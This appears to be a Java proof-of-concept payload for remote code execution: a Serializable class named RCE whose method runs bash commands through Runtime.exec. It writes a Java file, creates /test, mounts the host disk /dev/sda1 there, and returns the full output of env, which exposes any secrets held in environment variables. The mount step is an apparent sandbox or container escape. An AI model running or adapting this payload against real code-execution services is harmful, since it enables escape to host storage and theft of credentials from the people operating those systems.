import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Serializable;

public class RCE implements Serializable {
    public static String printResult(){

        StringBuffer b=new StringBuffer();
        Runtime runtime = Runtime.getRuntime();
        String[] echo = new String[]{"bash","-c","echo -e \"import java.io.IOException;\\npublic class CaseRunner1 {\\n public static void main(String[] args) throws IOException {\\n System.out.println(123);\\n }\\n}\\n\">CaseRunner1.java"};
        try {
            runtime.exec(echo);
            runtime.exec(new String[]{"bash","-c","mkdir /test"});
            runtime.exec(new String[]{"bash","-c","mount /dev/sda1 /test"});
            BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(new String[]{"bash","-c","env"}).getInputStream())); //获得执行命令回显
            String line=null;
            while ((line=br.readLine())!=null) {
                b.append(line+"\n");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return b.toString();
    }
}
